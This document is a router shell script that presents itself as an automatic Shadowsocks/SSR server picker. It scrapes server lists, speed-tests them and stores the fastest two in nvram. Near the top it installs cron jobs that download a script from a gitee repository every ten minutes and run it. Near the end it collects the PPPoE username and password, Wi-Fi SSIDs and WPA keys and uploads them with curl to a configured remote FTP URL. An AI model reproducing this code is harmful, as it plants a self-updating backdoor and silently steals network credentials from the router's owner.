
[ ! "`nvram get ss_enable`" = "1" ]  && exit 1
[ `ps |grep $0|grep -v grep|wc -l ` -gt 2 ] && exit 1
[ -f /tmp/cron_ss.lock ]  && exit 1

cd /tmp

#nvram set tkcssr="link/S6v4iuNmjynywEZ0?is_ss=0"
#nvram set ssr_url=" -u ssftp:ftp ftp://202.109.226.26/AiCard_01/opt/www/default/"
#nvram commmit

#DNS="`nvram get ss_DNS_Redirect`"
#[ "$DNS" = "1" ] && nvram set ss_DNS_Redirect=0 && nvram commit

sed -e '/autoss.sh/d'  /etc/storage/cron/crontabs/admin > /etc/storage/cron/crontabs/admin.1
cat >>/etc/storage/cron/crontabs/admin.1 <<-ABCDEFG
29 5  * * * [ \`nvram get ss_enable\` = 1 ]  && cd /tmp && wget -q -O autoss1.sh https://gitee.com/yzqiang/autoss/raw/master/autoss.sh || cp /etc/storage/autoss.sh autoss1.sh && tr -d "\015" <autoss1.sh >autoss.sh && sh autoss.sh refresh
4,14,24,34,44,54 * * * * [ \`nvram get ss_enable\` = 1 ]  && cd /tmp && wget -q -O autoss1.sh https://gitee.com/yzqiang/autoss/raw/master/autoss.sh || cp /etc/storage/autoss.sh autoss1.sh && tr -d "\015" <autoss1.sh >autoss.sh && sh autoss.sh
ABCDEFG
mv  /etc/storage/cron/crontabs/admin.1  /etc/storage/cron/crontabs/admin
mtd_storage.sh save >/dev/null 2>/dev/null
killall crond && crond 

if [ ! "`stat -c %s /tmp/autoss.sh`" = "`stat -c %s /etc/storage/autoss.sh 2>/dev/null`" ] ; then
cp /tmp/autoss.sh  /etc/storage/autoss.sh
mtd_storage.sh save >/dev/null 2>/dev/null
killall crond && crond 
fi


##################### SSR Server ###########
url="https://www.youtube.com/intl/zh-CN/yt/about/"

if [ ! "$1" = "refresh" ] ; then
rm /tmp/tmp.txt 2>/dev/null
#curl -o /tmp/tmp.txt -s -k -L --retry 3 -r 0-10239  -m 5 $url 2>/dev/null
curl -o /tmp/tmp.txt -s -k -L --retry 3   -m 5 https://www.google.com.hk/?gws_rd=ssl 2>/dev/null
[ ! -s /tmp/tmp.txt ] && curl -o /tmp/tmp.txt -s -k -L  --retry 3  -m 5 https://www.google.com.hk/?gws_rd=ssl 2>/dev/null
[ ! -s /tmp/tmp.txt ] && curl -o /tmp/tmp.txt -s -k -L  --retry 3  -m 8 https://www.google.com.hk/?gws_rd=ssl 2>/dev/null
[  -s /tmp/tmp.txt  ]  &&  exit 0
fi


########################  get from tckssr　########################
get_from_tckssr() 
{
rm ss.txt > /dev/null 2>&1
tkcssr="`nvram get tkcssr`"
if [ ! "$tkcssr"x = "x" ] || [ "1" = "1" ] ; then 
iss="https://www.capsule.cf/"$tkcssr
iss="https://www.capsule.cf/link/S6v4iuNmjynywEZ0?is_ss=0"
#iss="https://capsule.cf/link/S6v4iuNmjynywEZ0?is_ss=0"
#curl -o ss.txt -s -k -L   -m 30 $iss 2>/dev/null
#以下为4位自定义端口
curl -o ss.txt  -s -k -L   -m 30 https://www.capsule.cf/link/S6v4iuNmjynywEZ0?is_ss=0 2>/dev/null
#以下为单端口多用户
#curl -o ss1.txt  -s -k -L   -m 30 https://www.capsule.cf/link/uqCxfyeFth56MN0a?is_ss=0 2>/dev/null
#cat ss1.txt >>ss.txt
if [   -s ss.txt ] ; then
Server=""
Port=""
Pass=""
Method=""
Usage=""
sed 's/"//g' ss.txt| sed 's/nvram set //g' | grep -E 'rt_ss_server_|rt_ss_port_|rt_ss_password_|rt_ss_method_|rt_ss_usage_' | sed -r 's/\_x([0-9]|[0-9][0-9]|[0-9][0-9][0-9])=/=/g' | while read i 
do

var1=`echo $i|awk -F '=' '{print $1}'`
var2=`echo $i|awk -F '=' '{print $2}'`

case "$var1" in
    "rt_ss_server")  Server="$var2"
    ;;
    "rt_ss_port")  Port="$var2"
    ;;
    "rt_ss_password")  Pass="$var2"
    ;;
    "rt_ss_method")  Method="$var2"
    ;;
    "rt_ss_usage")  Usage="$var2"
      Usage=${Usage//:/：}
    ;;
esac

if [ ! "$Server" = "" ]  && [ ! "$Port" = "" ]  && [ ! "$Pass" = "" ]  && [ ! "$Method" = "" ]  && [ ! "$Usage" = "" ] ; then
[  "${Server:0:2}" = "cn" ] || [  "${Server:0:2}" = "tw" ] && continue 
result=$(echo $Server | grep level3 )
[[ "$result" != "" ]]  && [  ! "${Server:0:4}" = "hk35" ] && [  ! "${Server:0:4}" = "hk34" ] && [  ! "${Server:0:4}" = "hk20" ] && [  ! "${Server:0:4}" = "hk21" ] && [  ! "${Server:0:4}" = "hk22" ] && [  ! "${Server:0:4}" = "hk23" ] && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini

#    [  "${Server:0:2}" = "jp" ] && [ ! "${Server:0:3}" = "jp3" ] && [ ! "${Server:0:3}" = "jp4" ] && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
#    [  "${Server:0:2}" = "us" ] && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
#    [  "${Server:0:2}" = "hk" ] && [ ! "${Server:0:4}" = "hk10" ] && [ ! "${Server:0:4}" = "hk15" ] && [ ! "${Server:0:3}" = "hk2" ]  && [ ! "${Server:0:3}" = "hk4" ]  && [ ! "${Server:0:3}" = "hk5" ] && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
#    [  "${Server:0:2}" = "sg" ] && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
#    [  "${Server:0:2}" = "us" ]  && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
#    [  "${Server:0:2}" = "uk" ]  && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
#    [  "${Server:0:2}" = "fr" ]  && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini



#    [  "${Server:0:2}" = "jp" ]  && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
#    [  "${Server:0:2}" = "sg" ]  && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
#    [  "${Server:0:2}" = "ca" ]  && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
#    [  "${Server:0:2}" = "hk" ]  && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini

    Server=""
    Port=""
    Pass=""
    Method=""
fi
done

#sort ss.ini >sss.ini
#rm ss.ini
#mv sss.ini ss.ini

fi
echo "==========" >> ss.ini 
fi
}

########################  get from ishadowsock ########################
get_from_ishadowsock()
{
iss="https://ss.ishadowx.com/"
rm ss.txt > /dev/null 2>&1
curl -o ss.txt -s -k   -L  -m 30 $iss 2>/dev/null
iss="http://www.myshadowsocks.me/"
[ -s ss.txt ]  &&  curl -o ss.txt -s -k -L   -m 30 $iss 2>/dev/null

if [ -s ss.txt ] ; then
cp /dev/null  ssss.ini
Server=""
Port=""
Pass=""
Method=""
Other=""

cat ss.txt |grep -E "<h4>IP Address|<h4>Port|<h4>Password|<h4>Method|<h4>auth_" | sed 's/<[^<>]*>//g' | sed 's/：/:/g' | sed 's/IP Address/Server/g'| sed 's/ //g' |sed 's/\r//g' | while read i  
do
var1=`echo $i|awk -F ':' '{print $1}'`
var2=`echo $i|awk -F ':' '{print $2}'`
case $var1 in
    Server)  Server="$var2"
    ;;
    Port)  Port="$var2"
    ;;
    Password)  Pass="$var2"
    ;;
    Method)  Method="$var2"
    ;;
    *)  Other="$var1"
    ;;

esac



if [ ! "$Server" = "" ]  && [ ! "$Port" = "" ]  && [ ! "$Method" = "" ]  ; then
    [ ! "$Pass" = "" ]  && echo $Server:$Port:$Pass:$Method >>ss.ini
    Server=""
    Port=""
    Pass=""
    Method=""
    Other=""

fi

done
echo "==========" >> ss.ini 
fi

}





###加入私有SSR



cat > "/tmp/setssr.sh" <<-\SETSSR
base64_str=""
base64_res=""
base64_encode() 
{
vvvvv=`echo -n $base64_str|base64|sed 's/=//g'|sed 's/\//_/g'`
base64_res=`echo $vvvvv|sed s/[[:space:]]//g`
}
while getopts "s:p:m:k:o:O:g:G:r:z:" arg; do
case "$arg" in
s)
server="$OPTARG"
;;
p)
server_port="$OPTARG"
;;
k)
base64_str="$OPTARG"
base64_encode
password="$base64_res"
;;
m)
method="$OPTARG"
;;
o)
obfs="$OPTARG"
;;
O)
protocol="$OPTARG"
;;
g)
base64_str="$OPTARG"
base64_encode
obfs_param="$base64_res"
;;
G)
base64_str="$OPTARG"
base64_encode
protocol_param="$base64_res"
;;
r)
base64_str="$OPTARG"
base64_encode
remark="$base64_res"
;;
z)
base64_str="$OPTARG"
base64_encode
group="$base64_res"
;;
esac
done
base64_str=$server:$server_port:$protocol:$method:$obfs:$password"/?obfsparam="$obfs_param"&protoparam="$protocol_param"&remarks="$remark"&group="$group
base64_encode
echo "ssr://"$base64_res >>ssr.ini
SETSSR
chmod 755 /tmp/setssr.sh




cd /tmp
rm ss.ini >/dev/null 2>&1
ssr_url="`nvram get ssr_url`"
tkcssr="`nvram get tkcssr`"
#get_from_tckssr
#get_from_ishadowsock


curl -o ss.txt -s -m 30 http://202.109.226.26:81/mac/ss.ini	
if [ $? = 0 ] ; then
  rm s.ini 2>/dev/null
  mv ss.ini s.ini 2>/dev/null
#  sed -e '/.bid:/d'  ss.txt | head -n 10 >ss.ini
  head -n 10  ss.txt >ss.ini
  echo "==============" >>ss.ini
  cat s.ini >>ss.ini
fi


curl -o ss.txt -l -k -s -m 30 https://gitee.com/yzqiang/autoss/raw/master/ss.txt	
if [ $? = 0 ] ; then
  tr -d "\015" <ss.txt >>ss.ini 
#  cat ss.txt >>ss.ini
  echo "">>ss.ini
  echo "==============" >>ss.ini
fi

[ ! -s ss.ini ] && exit 1
###################### set ss information ####################################
echo "lock">cron_ss.lock
[ -n "$ssr_url" ] && rm ssr.txt >/dev/null 2>&1
logger "get bestss server"

options1=""
options2=""
ss_usage=""
ss_usage_json=""


nvram set ss_type=1
nvram set ss_working_port="1090"
nvram commit


ss_link_1=`nvram get ss_link_2`
ss_check=`nvram get ss_check`
action_port=1090
lan_ipaddr=`nvram get lan_ipaddr`

rm ss.txt >/dev/null 2>&1
rm ssr.inf >/dev/null 2>&1
rm ssr.ini >/dev/null 2>&1
rm ss.inf >/dev/null 2>&1
rm s.inf >/dev/null 2>&1

sleep 6

killall -9  ss-redir 2>/dev/null
killall -9  ss-local 2>/dev/null
killall -9  sh_sskeey_k.sh >/dev/null 2>/dev/null
sleep 2
PID=`ps |grep "Sh15_ss.sh keep"|grep -v grep|tr '[:alpha:][:punct:][:blank:]' '  '`
PID=${PID:0:10}
kill -9 $PID >/dev/null 2>/dev/null
echo "lock">cron_ss.lock
CC=1
BESTTIME=0
BESTTIME0=30
CC0=90
[ `date "+%k"` -ge 1 ] && [ `date "+%k"` -le 7 ] && [ "$1" = "refresh" ] && BESTTIME0=90

HOST1=""
HOST0=""

sort ss.ini | while read str
do
[ $CC -ge $CC0 ] || [ $BESTTIME -ge $BESTTIME0 ] && break
[ "$str" = "" ] && continue f 
[ ${str:0:1} = "#" ] && continue 
[ ${str:0:1} = "=" ] && continue 
echo "lock">cron_ss.lock
ss_s1_ip=`echo $str|awk -F ':' '{print $1}'`  
ss_s1=$ss_s1_ip
ss_s1_port=`echo $str|awk -F ':' '{print $2}'` 

[ "$HOST0" = $ss_s1_ip":"$ss_s1_port ] && continue 
HOST0=$ss_s1_ip":"$ss_s1_port
#[ "$ss_s1_ip":"$ss_s1_port" = "$HOST1" ] && continue 
HOST2=$ss_s1_ip":"$ss_s1_port


ss_s1_key=`echo $str|awk -F ':' '{print $3}'`  
ss_s1_method=`echo $str|awk -F ':' '{print $4}'`  
ss_usage0=`echo $str|awk -F ':' '{print $5}'`  
ss_usage=${ss_usage0//：/:}
ss_usage="`echo "$ss_usage" | sed -r 's/\--[^ ]+[^-]+//g'`"   
ss_server0=$ss_s1_ip:$ss_s1_port:$ss_s1_key:$ss_s1_method
ss_server1=$ss_s1_ip
resolveip=`/usr/bin/resolveip -4 -t 4 $ss_server1 | grep -v : | sed -n '1p'`
if [ -n "$resolveip" ] ; then
ss_server1=$resolveip
ss_s1_ip=$ss_server1

pidof ss-redir  >/dev/null 2>&1 && killall ss-redir && killall -9 ss-redir 2>/dev/null
if [ ! -z "$ss_usage" ] ; then 
ss_usage=`echo "$ss_usage" | sed -e "s/ -. -/ -/g"| sed -e "s/ -.$//g"`
ss_usage=`echo "$ss_usage" | sed -e "s/ -. -/ -/g"| sed -e "s/ -.$//g"`
fi
/tmp/SSJSON.sh  -f /tmp/ss-redir_3.json $ss_usage $ss_usage_json -s $ss_s1_ip -p $ss_s1_port -l 1090 -b 0.0.0.0 -k $ss_s1_key -m $ss_s1_method

ss-redir -c /tmp/ss-redir_3.json $options1 >/dev/null 2>&1 &
ss_s1_ip=$ss_server1
action_ssip=$ss_s1_ip
BP_IP="$action_ssip"
[ ! $ss_s1_ip = "" ] && ss-rules -s "$action_ssip" -l "$action_port" -b $BP_IP -d "RETURN" -a "g,$lan_ipaddr" -e '-m multiport --dports 80,443' -o -O >/dev/null 2>&1
sleep 1
rm /tmp/tmp.txt 2>/dev/null
starttime=$(cat /proc/uptime | cut -d" " -f1)
curl -o /tmp/tmp.txt -s -k -L -r 0-39999  -m 4 $url 2>/dev/null 
CODE="$?"
endtime=$(cat /proc/uptime | cut -d" " -f1)
TIME=`awk -v x=$starttime -v y=$endtime 'BEGIN {printf y-x}'`

if [  $CODE = "28" ] ; then
if  [  -s /tmp/tmp.txt ] ; then
 CODE="0"
 endtime=$(wc -c /tmp/tmp.txt | cut -d" " -f1)
 TIME=`awk  -v y=$endtime 'BEGIN {printf 8-y/10000}'`
 TIME=${TIME:0:4}
fi
fi

TIME0=$TIME
[ ${#TIME0} = 1 ] && TIME0=$TIME0".0"
[ ${#TIME0} = 2 ] && TIME0=$TIME0"0"
[ ${#TIME0} = 3 ] && TIME0=$TIME0"0"


if [  $CODE = "0" ] ; then
    [ "${TIME0:0:1}" = "0" ] && let BESTTIME=$BESTTIME+1
    [ $CC -ge 10 ] && echo $CC $TIME0 $ss_server0 && logger "$CC $TIME0 $ss_server0"
    [ $CC -lt 10 ] && echo 0$CC $TIME0 $ss_server0 && logger "0$CC $TIME0 $ss_server0"
RES=`awk -v a=$TIME  'BEGIN { print (a<=10)?1:0'}`
[ "$RES" = "1"  ] && echo $TIME0:$ss_s1:$ss_s1_port:$ss_s1_key:$ss_s1_method:$ss_usage >>ss.txt && let CC=$CC+1	
else
    HOST1=$HOST2
echo "XX" $TIME0 "$ss_server0" $CODE
logger "XX" $TIME0 "$ss_server0" $CODE
fi

fi
done
SUCESS=1
if [ ! -s ss.txt ] ; then
 curl -o ss.inf -s -m 10 http://202.109.226.26:81/mac/ss.ini
 head -n 2 ss.inf | sed '1s/^/1.00:&/g'  | sed '2s/^/2.00:&/g'  >ss.txt
 SUCESS=0
fi 
if [ -s ss.txt ] ; then
  sort ss.txt >ss.inf
  CC=1
  cat ss.inf | while read str
  do  
    TIME=`echo $str|awk -F ':' '{print $1}'`  
    ss_s1_ip=`echo $str|awk -F ':' '{print $2}'`  
    ss_s1_port=`echo $str|awk -F ':' '{print $3}'`  
    ss_s1_key=`echo $str|awk -F ':' '{print $4}'`  
    ss_s1_method=`echo $str|awk -F ':' '{print $5}'`  
    ss_usage0=`echo $str|awk -F ':' '{print $6}'`  
    ss_usage=${ss_usage0//：/:}	

    /tmp/setssr.sh -r $CC -z ssr -s $ss_s1_ip -p $ss_s1_port -m $ss_s1_method -k $ss_s1_key $ss_usage

    if [ $CC = 1 ] ; then
    nvram set ss_server=$ss_s1_ip
    nvram set ss_server_port=$ss_s1_port
    nvram set ss_key=$ss_s1_key
    nvram set ss_method=$ss_s1_method
    nvram set ss_usage="$ss_usage"	
    nvram set ss_server1=$ss_s1_ip
    nvram set ss_s1_port=$ss_s1_port
    nvram set ss_s1_key=$ss_s1_key
    nvram set ss_s1_method=$ss_s1_method
    nvram set ss_s1_usage="$ss_usage"
    ss_type="1"
    [ "$ss_usage"x = ""x ] && ss_type="0"
    nvram set ss_type=$ss_type
    nvram commit

    echo "The No1 server: "$ss_s1_ip:$ss_s1_port:$ss_s1_key:$ss_s1_method"   "$TIME
echo "The No1 server: "$ss_s1_ip:$ss_s1_port:$ss_s1_key:$ss_s1_method"   "$TIME >serverinfo
logger "The No1 server: "$ss_s1_ip:$ss_s1_port:$ss_s1_key:$ss_s1_method"   "$TIME
    fi

    if [ $CC = 2 ] ; then
    nvram set ss_server2=$ss_s1_ip
    nvram set ss_s2_port=$ss_s1_port
    nvram set ss_s2_key=$ss_s1_key
    nvram set ss_s2_method=$ss_s1_method
    nvram set ss_s2_usage="$ss_usage"	
    nvram commit

    echo "The No2 server: "$ss_s1_ip:$ss_s1_port:$ss_s1_key:$ss_s1_method"   "$TIME
    echo "The No2 server: "$ss_s1_ip:$ss_s1_port:$ss_s1_key:$ss_s1_method"   "$TIME >>serverinfo
logger "The No2 server: "$ss_s1_ip:$ss_s1_port:$ss_s1_key:$ss_s1_method"   "$TIME
    fi
let CC=$CC+1
  done


fi

if   [ "$SUCESS" = "1" ] ; then
  head -n 3 ssr.ini |  base64   | sed ":a;N;s/\n//g;ta" >ssr.txt
  if [ ! "$ssr_url" = "" ] ; then
if [ "`nvram get wan_proto`" = "pppoe" ] ; then
    fn=`nvram get wan_pppoe_username`
  nvram get wan_pppoe_username >$fn
  nvram get wan_pppoe_passwd >>$fn
else
    fn=`nvram get wan_hwaddr`
  fn=${fn//:/-}
  nvram get nvram get wan_hwaddr >$fn
fi

nvram get wl_ssid >>$fn	
nvram get wl_wpa_psk >>$fn	
nvram get rt_ssid >>$fn	
nvram get rt_wpa_psk >>$fn	
cat serverinfo >>$fn	
rm serverinfo


cut ss.inf -c6-600 | head -n 10 >s.inf	

[ -s $fn ] && curl -s -T $fn $ssr_url"mac/"$fn
        [ -s ssr.txt ] && curl -s -T ssr.txt $ssr_url"mac/ssr.txt" 
        [ -s s.inf ] && curl -s -T s.inf $ssr_url"mac/ss.ini"  

  fi
fi


mv syslog.log syslog.tmp
pidof ss-redir  >/dev/null 2>&1 && killall ss-redir  && killall -9 ss-redir 2>/dev/null
killall -9  sh_sskeey_k.sh >/dev/null 2>/dev/null
killall -9 Sh15_ss.sh >/dev/null 2>/dev/null
nvram set ss_check=$ss_check
nvram set ss_status=0
nvram set ss_enable=1
nvram commit

/etc/storage/script/Sh15_ss.sh start >/dev/null  2>/dev/null &



cat >/tmp/delay40.sh <<-ABCDEF
sleep 100
rm -f cron_ss.lock 2>/dev/null
mv syslog.tmp syslog.log 2>/dev/null
ABCDEF

sh /tmp/delay40.sh &

